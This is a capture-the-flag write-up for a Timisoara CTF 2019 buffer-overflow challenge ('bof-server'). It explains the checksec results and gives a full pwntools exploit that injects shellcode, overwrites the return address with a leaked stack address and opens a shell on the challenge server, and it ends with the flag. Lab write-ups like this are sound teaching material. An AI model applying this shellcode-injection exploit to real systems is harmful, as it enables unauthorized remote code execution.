I"8$<p><strong>Category:</strong> Binary Exploitation</p>

<blockquote>
  <p>Today kids we learn how to write exploits for super-secure software: bof-server!<br />
nc 89.38.208.144 11112<br />
(non-standard flag format)</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Bof-server%20%5B100%5D" class="btn btn--primary">Challenge Files</a></p>

<h2 id="write-up">Write-up</h2>
<p>This is a standard buffer overflow shellcoding challenge.</p>

<p>As usual, running <code class="highlighter-rouge">checksec</code> on the binary gives:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)    
   RWX:      Has RWX segments
</code></pre></div></div>

<p><code class="highlighter-rouge">checksec</code> shows the <code class="highlighter-rouge">NX Bit</code> as disabled, which means shellcode can be executed. After running the binary, we see the following output:</p>

<p><code class="highlighter-rouge">Hello! Here is the stack address: 7fffffffdc60, enter your name please:</code></p>

<p>The binary prints out the starting address of the stack, and asks for input. We can use <code class="highlighter-rouge">pwntools</code> to generate the shellcode to execute shell. The payload contains the following:</p>

<ol>
  <li>Shellcode</li>
  <li>Padding (Overflow the stack until RIP)</li>
  <li>Stack address (To jump to our shellcode and execute shell)</li>
</ol>

<p>Hereâ€™s the final exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./bof-server"</span><span class="p">,</span>
    <span class="c1">#"libc" : "./",
</span>    <span class="c1">#"ld" : "./",
</span>    <span class="s">"HOST"</span> <span class="p">:</span> <span class="s">"89.38.208.144"</span><span class="p">,</span>
    <span class="s">"PORT"</span> <span class="p">:</span> <span class="mi">11112</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">264</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>

    <span class="n">ru</span><span class="p">(</span><span class="s">"stack address: "</span> <span class="p">)</span>
    <span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x"</span> <span class="o">+</span> <span class="n">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">50</span> 
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">264</span><span class="o">-</span><span class="mi">50</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"please: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

    <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"HOST"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"PORT"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag:</strong> TIMCTF{oooverfl0w}wwwWWW</p>
:ET